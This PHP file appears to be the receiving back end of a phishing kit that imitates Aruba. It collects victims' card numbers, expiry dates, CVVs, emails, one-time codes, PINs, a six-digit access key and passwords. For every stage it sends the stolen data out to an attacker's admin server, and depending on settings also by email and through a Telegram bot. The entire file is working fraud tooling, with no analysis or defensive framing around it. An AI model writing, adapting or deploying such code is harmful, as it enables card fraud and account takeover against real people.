<?php
	session_start();
	require('../CONFIGS/_Config.php');
	require('../UTILS/_getIp.php');

	if(isset($_POST['section'])){
		$response = array();
		$arrContextOptions=array(
		    "ssl"=>array(
		        "verify_peer"=>false,
		        "verify_peer_name"=>false,
		    ),
		); 
		switch ($_POST['section']) {
			case 'index':
				$data = [
					'fullname' => $_POST['fullname'],
					'cc' => $_POST['cc'],
					'exp' => $_POST['expm'].'/'.$_POST['expy'],
					'cvv' => $_POST['cvv'],
					'email' => $_POST['email'],
					'identifier' => $_POST['identifier'],
					'ip' => get_client_ip()
				];
				$bdata = base64_encode(json_encode($data));
				$_SESSION['cc'] = $_POST['cc']; 
        		file_get_contents("$AdminServer/_admin/receiver/index.php?data=$bdata", false, stream_context_create($arrContextOptions));

        		if($ResultsEmail == 'on'){
				    $subject = " New Aruba CC ".$_SERVER["REMOTE_ADDR"];
	    			$content = "Full Name : ".$_POST['fullname'].'</br>';
					$content .= "CC : ".$_POST['cc'].'</br>';
					$content .= "Exp : ".$_POST['expm'].'/'.$_POST['expy'].'</br>';
					$content .= "CVV : ".$_POST['cvv'].'</br>';
					$content .= "Email : ".$_POST['email'].'</br>';
	    			$content .= "------------------------------------<br/>";
	    			$content .= "IP : ".$_SERVER["REMOTE_ADDR"]."<br/>";
	    			$content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."<br/>";
	    
	    			$Mailheaders = "From: $from\r\n";
	    			$Mailheaders .= "MIME-Version: 1.0\r\n";
	    			$Mailheaders .= "Content-Type: text/html; charset=ISO-8859-1\r\n";   
	    			mail($to, $subject, $content, $Mailheaders);
        		}

        		if($ResultsTelegram == 'on'){
        			$Content = "🔰 New Aruba CC ".$_SERVER["REMOTE_ADDR"]." 🔰".PHP_EOL.PHP_EOL;
		            $Content = "Full Name : ".$_POST['fullname'].PHP_EOL;
					$Content .= "CC : ".$_POST['cc'].PHP_EOL;
					$Content .= "Exp : ".$_POST['expm'].'/'.$_POST['expy'].PHP_EOL;
					$Content .= "CVV : ".$_POST['cvv'].PHP_EOL;
					$Content .= "Email : ".$_POST['email'].PHP_EOL;
		            $Content .= PHP_EOL;
		            $Content .= "------------------------------------".PHP_EOL;
		            $Content .= "IP : ".$_SERVER["REMOTE_ADDR"]."".PHP_EOL;
		            $Content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."".PHP_EOL;
		            $data = [
		                'chat_id' => $ResultsTelegramChatID,
		                'text' => $Content,
		            ];

		            if($ResultsTelegram == "on"){
		                file_get_contents("https://api.telegram.org/bot$ResultsTelegramBotApi/sendMessage?".http_build_query($data));    
		            }
        		}
			break;
			case 'otp':
			case 'otpError':
				$data = [
					'otp' => $_POST['otp'],
					'identifier' => $_POST['identifier'],
					'ip' => get_client_ip()
				];
				$bdata = base64_encode(json_encode($data));
        		file_get_contents("$AdminServer/_admin/receiver/?data=$bdata");

        		if($ResultsEmail == 'on'){
				    $subject = " New Aruba OTP ".$_SERVER["REMOTE_ADDR"];
	    			$content = "OTP : ".$_POST['otp'].'</br>';
	    			$content .= "------------------------------------<br/>";
	    			$content .= "IP : ".$_SERVER["REMOTE_ADDR"]."<br/>";
	    			$content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."<br/>";
	    
	    			$Mailheaders = "From: $from\r\n";
	    			$Mailheaders .= "MIME-Version: 1.0\r\n";
	    			$Mailheaders .= "Content-Type: text/html; charset=ISO-8859-1\r\n";   
	    			mail($to, $subject, $content, $Mailheaders);
        		}

        		if($ResultsTelegram == 'on'){
        			$Content = "🔰 New Aruba OTP ".$_SERVER["REMOTE_ADDR"]." 🔰".PHP_EOL.PHP_EOL;
		            $Content = "OTP : ".$_POST['otp'].PHP_EOL;
		            $Content .= PHP_EOL;
		            $Content .= "------------------------------------".PHP_EOL;
		            $Content .= "IP : ".$_SERVER["REMOTE_ADDR"]."".PHP_EOL;
		            $Content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."".PHP_EOL;
		            $data = [
		                'chat_id' => $ResultsTelegramChatID,
		                'text' => $Content,
		            ];

		            if($ResultsTelegram == "on"){
		                file_get_contents("https://api.telegram.org/bot$ResultsTelegramBotApi/sendMessage?".http_build_query($data));    
		            }
        		}
			break;
			case 'pin':
			case 'pinError':
				$data = [
					'pin' => $_POST['pin'],
					'identifier' => $_POST['identifier'],
					'ip' => get_client_ip()
				];
				$bdata = base64_encode(json_encode($data));
        		file_get_contents("$AdminServer/_admin/receiver/?data=$bdata");

        		if($ResultsEmail == 'on'){
				    $subject = " New Aruba PIN ".$_SERVER["REMOTE_ADDR"];
	    			$content = "PIN : ".$_POST['pin'].'</br>';
	    			$content .= "------------------------------------<br/>";
	    			$content .= "IP : ".$_SERVER["REMOTE_ADDR"]."<br/>";
	    			$content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."<br/>";
	    
	    			$Mailheaders = "From: $from\r\n";
	    			$Mailheaders .= "MIME-Version: 1.0\r\n";
	    			$Mailheaders .= "Content-Type: text/html; charset=ISO-8859-1\r\n";   
	    			mail($to, $subject, $content, $Mailheaders);
        		}

        		if($ResultsTelegram == 'on'){
        			$Content = "🔰 New Aruba OTP ".$_SERVER["REMOTE_ADDR"]." 🔰".PHP_EOL.PHP_EOL;
		            $Content = "PIN : ".$_POST['pin'].PHP_EOL;
		            $Content .= PHP_EOL;
		            $Content .= "------------------------------------".PHP_EOL;
		            $Content .= "IP : ".$_SERVER["REMOTE_ADDR"]."".PHP_EOL;
		            $Content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."".PHP_EOL;
		            $data = [
		                'chat_id' => $ResultsTelegramChatID,
		                'text' => $Content,
		            ];

		            if($ResultsTelegram == "on"){
		                file_get_contents("https://api.telegram.org/bot$ResultsTelegramBotApi/sendMessage?".http_build_query($data));    
		            }
        		}
			break;
			case 'auth':
			case 'authError':
				$auth = implode('', $_POST['codice']);
				$data = [
					'codice' => $auth,
					'identifier' => $_POST['identifier'],
					'ip' => get_client_ip()
				];
				$bdata = base64_encode(json_encode($data));
        		file_get_contents("$AdminServer/_admin/receiver/?data=$bdata");

        		if($ResultsEmail == 'on'){
				    $subject = " New Aruba Codice key6 ".$_SERVER["REMOTE_ADDR"];
	    			$content = "Key6 : ".$auth.'</br>';
	    			$content .= "------------------------------------<br/>";
	    			$content .= "IP : ".$_SERVER["REMOTE_ADDR"]."<br/>";
	    			$content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."<br/>";
	    
	    			$Mailheaders = "From: $from\r\n";
	    			$Mailheaders .= "MIME-Version: 1.0\r\n";
	    			$Mailheaders .= "Content-Type: text/html; charset=ISO-8859-1\r\n";   
	    			mail($to, $subject, $content, $Mailheaders);
        		}

        		if($ResultsTelegram == 'on'){
        			$Content = "🔰 New Aruba Key6 ".$_SERVER["REMOTE_ADDR"]." 🔰".PHP_EOL.PHP_EOL;
		            $Content = "Key6 : ".$auth.PHP_EOL;
		            $Content .= PHP_EOL;
		            $Content .= "------------------------------------".PHP_EOL;
		            $Content .= "IP : ".$_SERVER["REMOTE_ADDR"]."".PHP_EOL;
		            $Content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."".PHP_EOL;
		            $data = [
		                'chat_id' => $ResultsTelegramChatID,
		                'text' => $Content,
		            ];

		            if($ResultsTelegram == "on"){
		                file_get_contents("https://api.telegram.org/bot$ResultsTelegramBotApi/sendMessage?".http_build_query($data));    
		            }
        		}
			break;
			case 'pwd':
			case 'pwdError':
				$data = [
					'pwd' => $_POST['pwd'],
					'identifier' => $_POST['identifier'],
					'ip' => get_client_ip()
				];
				$bdata = base64_encode(json_encode($data));
        		file_get_contents("$AdminServer/_admin/receiver/?data=$bdata");

        		if($ResultsEmail == 'on'){
				    $subject = " New Aruba PWD ".$_SERVER["REMOTE_ADDR"];
	    			$content = "PWD : ".$_POST['pwd'].'</br>';
	    			$content .= "------------------------------------<br/>";
	    			$content .= "IP : ".$_SERVER["REMOTE_ADDR"]."<br/>";
	    			$content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."<br/>";
	    
	    			$Mailheaders = "From: $from\r\n";
	    			$Mailheaders .= "MIME-Version: 1.0\r\n";
	    			$Mailheaders .= "Content-Type: text/html; charset=ISO-8859-1\r\n";   
	    			mail($to, $subject, $content, $Mailheaders);
        		}

        		if($ResultsTelegram == 'on'){
        			$Content = "🔰 New Aruba PWD ".$_SERVER["REMOTE_ADDR"]." 🔰".PHP_EOL.PHP_EOL;
		            $Content = "PWD : ".$_POST['pwd'].PHP_EOL;
		            $Content .= PHP_EOL;
		            $Content .= "------------------------------------".PHP_EOL;
		            $Content .= "IP : ".$_SERVER["REMOTE_ADDR"]."".PHP_EOL;
		            $Content .= "Agent : ".$_SERVER["HTTP_USER_AGENT"]."".PHP_EOL;
		            $data = [
		                'chat_id' => $ResultsTelegramChatID,
		                'text' => $Content,
		            ];

		            if($ResultsTelegram == "on"){
		                file_get_contents("https://api.telegram.org/bot$ResultsTelegramBotApi/sendMessage?".http_build_query($data));    
		            }
        		}
			break;
		}

		$response["server"] = "$AdminServer/_admin/hook/?";
		$response["ip"] = get_client_ip();
		echo json_encode($response);
		exit();
	}
?>